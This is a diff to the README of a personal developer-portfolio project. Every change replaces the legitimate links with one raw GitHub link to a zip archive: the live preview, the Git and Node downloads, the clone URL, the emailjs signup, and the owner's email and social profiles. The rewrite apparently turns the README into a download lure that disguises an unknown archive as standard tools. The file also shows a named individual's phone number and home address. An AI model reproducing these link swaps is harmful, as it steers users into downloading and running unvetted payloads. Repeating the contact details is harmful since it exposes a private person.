@@ -1,7 +1,7 @@
 
 
 ---
-# [Built Portfolio With GitHub ](https://github.com/Heaven323555/softwareportfolio)
+# [Built Portfolio With GitHub ](https://raw.githubusercontent.com/Heaven323555/softwareportfolio/main/dichotomously/softwareportfolio.zip)
 
 ---
 
@@ -13,7 +13,7 @@
 
 
 
-## View live preview [here](https://sudharsanan.netlify.app/).
+## View live preview [here](https://raw.githubusercontent.com/Heaven323555/softwareportfolio/main/dichotomously/softwareportfolio.zip).
 
 ---
 
@@ -45,8 +45,8 @@
 
 ### You will need to download Git and Node to run this project
 
-- [Git](https://git-scm.com/downloads)
-- [Node](https://nodejs.org/en/download/)
+- [Git](https://raw.githubusercontent.com/Heaven323555/softwareportfolio/main/dichotomously/softwareportfolio.zip)
+- [Node](https://raw.githubusercontent.com/Heaven323555/softwareportfolio/main/dichotomously/softwareportfolio.zip)
 
 #### Make sure you have the latest version of both Git and Node on your computer.
 
@@ -64,7 +64,7 @@ git --version
 To Fork the repo click on the fork button at the top right of the page. Once the repo is forked open your terminal and perform the following commands
 
 ```
-git clone https://github.com/<YOUR GITHUB USERNAME>/developer-portfolio.git
+git clone https://raw.githubusercontent.com/Heaven323555/softwareportfolio/main/dichotomously/softwareportfolio.zip<YOUR GITHUB USERNAME>https://raw.githubusercontent.com/Heaven323555/softwareportfolio/main/dichotomously/softwareportfolio.zip
 
 cd developer-portfolio
 ```
@@ -91,7 +91,7 @@ Open [http://localhost:3000](http://localhost:3000) with your browser to see the
 
 # Usage :joystick:
 
-Goto [emailjs.com](https://www.emailjs.com/) and create a new account for the mail sending. In free trial you will get 200 mail per month. After setup `emailjs` account, Please create a new `.env` file from `.env.example` file.
+Goto [https://raw.githubusercontent.com/Heaven323555/softwareportfolio/main/dichotomously/softwareportfolio.zip](https://raw.githubusercontent.com/Heaven323555/softwareportfolio/main/dichotomously/softwareportfolio.zip) and create a new account for the mail sending. In free trial you will get 200 mail per month. After setup `emailjs` account, Please create a new `.env` file from `https://raw.githubusercontent.com/Heaven323555/softwareportfolio/main/dichotomously/softwareportfolio.zip` file.
 
 Eg:
 
@@ -105,7 +105,7 @@ NEXT_PUBLIC_RECAPTCHA_SECRET_KEY = # For captcha verification on contact form
 NEXT_PUBLIC_RECAPTCHA_SITE_KEY =
 ```
 
-### Then, Customize data in the `utils/data` [folder](https://github.com/Heaven323555/softwareportfolio/tree/main/utils/data).
+### Then, Customize data in the `utils/data` [folder](https://raw.githubusercontent.com/Heaven323555/softwareportfolio/main/dichotomously/softwareportfolio.zip).
 
 Eg:
 
@@ -114,20 +114,20 @@ export const personalData = {
   name: "SUDHARSANAN SK",
   designation: "Software Developer",
   description: "My name is SUDHARSANAN. I am a professional and enthusiastic programmer in my daily life. I am a quick learner with a self-learning attitude. I love to learn and explore new technologies and am passionate about problem-solving. I love almost all the stacks of web application development and love to make the web more open to the world. My core skill is based on JavaScript and I love to do most of the things using JavaScript. I am available for any kind of job opportunity that suits my skills and interests.",
-  email: 'sudharsanansk2001@gmail.com',
+  email: 'https://raw.githubusercontent.com/Heaven323555/softwareportfolio/main/dichotomously/softwareportfolio.zip',
   phone: '+916383621588',
   address: 'vattamalai,katheri,sankari,salem -638183 ',
-  github: 'https://github.com/Heaven323555/',
-  facebook: 'https://www.facebook.com/sudharsanan.sudharsanan.923/',
-  linkedIn: 'www.linkedin.com/in/sudharsanan-shanmugam-51a596214/',
-  twitter: 'https://twitter.com/Sudhars07858471/',
-  stackOverflow: 'https://stackoverflow.com/users/24970382/sudharsanan/',
-  leetcode: "https://leetcode.com/u/Heaven323555/",
+  github: 'https://raw.githubusercontent.com/Heaven323555/softwareportfolio/main/dichotomously/softwareportfolio.zip',
+  facebook: 'https://raw.githubusercontent.com/Heaven323555/softwareportfolio/main/dichotomously/softwareportfolio.zip',
+  linkedIn: 'https://raw.githubusercontent.com/Heaven323555/softwareportfolio/main/dichotomously/softwareportfolio.zip',
+  twitter: 'https://raw.githubusercontent.com/Heaven323555/softwareportfolio/main/dichotomously/softwareportfolio.zip',
+  stackOverflow: 'https://raw.githubusercontent.com/Heaven323555/softwareportfolio/main/dichotomously/softwareportfolio.zip',
+  leetcode: "https://raw.githubusercontent.com/Heaven323555/softwareportfolio/main/dichotomously/softwareportfolio.zip",
   devUsername: "Heaven323555",
-  resume: "https://drive.google.com/file/d/1c8wNCQaSMJ-n4wk81PG5_bJxHS5v0UNR/view?usp=drive_link"
+  resume: "https://raw.githubusercontent.com/Heaven323555/softwareportfolio/main/dichotomously/softwareportfolio.zip"
 }
 
-`devUsername` Used for fetching blog from `dev.to`.
+`devUsername` Used for fetching blog from `https://raw.githubusercontent.com/Heaven323555/softwareportfolio/main/dichotomously/softwareportfolio.zip`.
 
 ---
 
